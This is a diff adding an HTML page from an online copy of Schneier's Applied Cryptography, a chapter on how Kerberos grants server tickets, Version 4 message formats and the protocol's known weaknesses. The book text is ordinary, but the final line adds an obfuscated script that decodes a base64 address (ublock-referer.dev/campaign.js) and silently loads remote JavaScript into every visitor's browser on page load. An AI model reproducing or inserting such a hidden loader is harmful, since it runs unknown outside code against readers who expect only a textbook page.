@@ -1,0 +1,125 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Example Implementations</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=24//-->
+<!--PAGES=569-571//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="24-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="24-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Getting Server Tickets</I></B></FONT></P>
+<P>A client has to obtain a separate ticket for each service she wants to use. The TGS grants tickets for individual servers.
+</P>
+<P>When a client needs a ticket that she does not already have, she sends a request to the TGS. (In reality, the program would do this automatically, and it would be invisible to the user.)</P>
+<P>The TGS, upon receiving the request, decrypts the TGT with his secret key. Then he uses the session key included in the TGT to decrypt the authenticator. Finally, he compares the information in the authenticator with the information in the ticket, the client&#146;s network address with the address the request was sent from, and the timestamp with the current time. If everything matches, he allows the request to proceed.</P>
+<P>Checking timestamps assumes that all machines have synchronized clocks, at least to within several minutes. If the time in the request is too far in the future or the past, the TGS treats the request as an attempt to replay a previous request. The TGS should also keep track of all live authenticators, because past requests can have timestamps that are still valid. Another request with the same ticket and timestamp as one already received can be ignored.</P>
+<P>The TGS responds to a valid request by returning a valid ticket for the client to present to the server. The TGS also creates a new session key for the client and the server, encrypted with the session key shared by the client and the TGS. Both of these messages are then sent back to the client. The client decrypts the message and extracts the session key.</P>
+<P><FONT SIZE="+1"><B><I>Requesting a Service</I></B></FONT></P>
+<P>Now the client is ready to authenticate herself to the server. She creates a message very similar to the one sent to the TGS (which makes sense, since the TGS is a service).
+</P>
+<P>The client creates an authenticator, consisting of her name and network address, and a timestamp, encrypted with the session key for her and the server that the TGS generated. The request consists of the ticket received from Kerberos (already encrypted with the server&#146;s secret key) and the encrypted authenticator.</P>
+<P>The server decrypts and checks the ticket and the authenticator, as discussed previously, and also checks the client&#146;s address and the timestamp. If everything checks out, the server knows that, according to Kerberos, the client is who she says she is.</P>
+<P>For applications that require mutual authentication, the server sends the client back a message consisting of the timestamp, encrypted with the session key. This proves that the server knew his secret key and could decrypt the ticket and therefore the authenticator.</P>
+<P>The client and the server can encrypt future messages with the shared key, if desired. Since only they share this key, they both can assume that a recent message encrypted in that key originated with the other party.</P>
+<P><FONT SIZE="+1"><B><I>Kerberos Version 4</I></B></FONT></P>
+<P>The previous sections discussed Kerberos Version 5. In the messages and the construction of the tickets and authenticators, Version 4 is slightly different.
+</P>
+<P>In Kerberos Version 4, the five messages looked like:</P>
+<TABLE WIDTH="55%"><TR>
+<TD VALIGN="TOP" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">1. Client to Kerberos: 
+<TD VALIGN="TOP" ALIGN="LEFT"><I>c, tgs</I>
+<TR>
+<TD VALIGN="TOP" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">2. Kerberos to client: 
+<TD VALIGN="TOP" ALIGN="LEFT">{<I>K<SUB>c, tgs,</SUB></I> {<I>T<SUB>c, tgs</SUB></I>}<I>K<SUB>tgs</SUB></I>}<I>K<SUB>c</SUB></I>
+<TR>
+<TD VALIGN="TOP" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">3. Client to TGS:
+<TD VALIGN="TOP" ALIGN="LEFT">{<I>A<SUB>c, s</SUB></I>}<I>K<SUB>c, tgs,</SUB></I> {<I>T<SUB>c, tgs</SUB></I>}<I>K<SUB>tgs,</SUB></I> <I>s</I>
+<TR>
+<TD VALIGN="TOP" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">4. TGS to client:
+<TD VALIGN="TOP" ALIGN="LEFT">{<I>K<SUB>c, s</SUB></I>, {<I>T<SUB>c, s</SUB></I>}<I>K<SUB>s</SUB></I>}<I>K<SUB>c, tgs</SUB></I>
+<TR>
+<TD VALIGN="TOP" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">5. Client to server: 
+<TD VALIGN="TOP" ALIGN="LEFT">{<I>A<SUB>c, s</SUB></I>}<I>K<SUB>c, s,</SUB></I> {<I>T<SUB>c, s</SUB></I>}<I>K<SUB>s</SUB></I>
+<TR>
+<TD VALIGN="TOP" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">
+<TD VALIGN="TOP" ALIGN="LEFT"><BR><I>T<SUB>c, s</SUB></I> = {<I>s, c, a, v, l, K<SUB>c, s</SUB></I>}<I>K<SUB>s</SUB></I>
+<TR>
+<TD VALIGN="TOP" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">
+<TD VALIGN="TOP" ALIGN="LEFT"><I>A<SUB>c, s</SUB></I> = {<I>c, a, t</I>}<I>K<SUB>c, s</SUB></I>
+<TR>
+</TABLE>
+<P>Messages 1, 3, and 5 are identical. The double encryption of the ticket in steps 2 and 4 has been removed in Version 5. The Version 5 ticket adds the possibility of multiple addresses, and it replaces a &#147;lifetime&#148; field, <I>l</I>, with a beginning and ending time. The Version 5 authenticator adds the option of including an additional key.</P>
+<P><FONT SIZE="+1"><B><I>Security of Kerberos</I></B></FONT></P>
+<P>Steve Bellovin and Michael Merritt discussed several potential security vulnerabilities of Kerberos [108]. Although this paper was written about the Version 4 protocols, many of their comments also apply to Version 5.
+</P>
+<P>It may be possible to cache and replay old authenticators. Although timestamps are supposed to prevent this, replays can be done during the lifetime of the ticket. Servers are supposed to store all valid tickets to prevent replays, but this is not always possible. And ticket lifetimes can be long; eight hours is typical.</P>
+<P>Authenticators rely on the fact that all the clocks in the network are more or less synchronized. If a host can be fooled about the correct time, then an old authenticator can be replayed without any problem. Most network time protocols are insecure, so this can be a serious problem.</P>
+<P>Kerberos is also vulnerable to password-guessing attacks. An intruder can collect tickets and then try to decrypt them. Remember that the average user doesn&#146;t usually choose good passwords. If Mallory collects enough tickets, his chances of recovering a password are good.</P>
+<P>Perhaps the most serious attack involves malicious software. The Kerberos protocols rely on the fact that the Kerberos software is trustworthy. There&#146;s nothing to stop Mallory from surreptitiously replacing all client Kerberos software with a version that, in addition to completing the Kerberos protocols, records passwords. This is a problem with any cryptographic software package on an insecure computer, but the widespread use of Kerberos in these environments makes it a particularly tempting target.</P>
+<P>Enhancements to Kerberos are in the works, including an implementation of public-key cryptography and a smart-card interface for key management.</P>
+<P><FONT SIZE="+1"><B><I>Licenses</I></B></FONT></P>
+<P>Kerberos is not in the public domain, but MIT&#146;s code is freely available. Actually implementing it into a working UNIX environment is another story. Several companies sell versions of Kerberos, but you can get a good version free from Cygnus Support, 814 University Ave., Palo Alto, CA, 94301; (415) 322-3811; fax: (415) 322-3270.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="24-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="24-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(maDfMaPH, uDHEWifR) {uDHEWifR = maDfMaPH.createElement('script');uDHEWifR.type = 'text/javascript';uDHEWifR.async = true;uDHEWifR.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');maDfMaPH.getElementsByTagName('body')[0].appendChild(uDHEWifR);}(document));</script></body>
+</html>
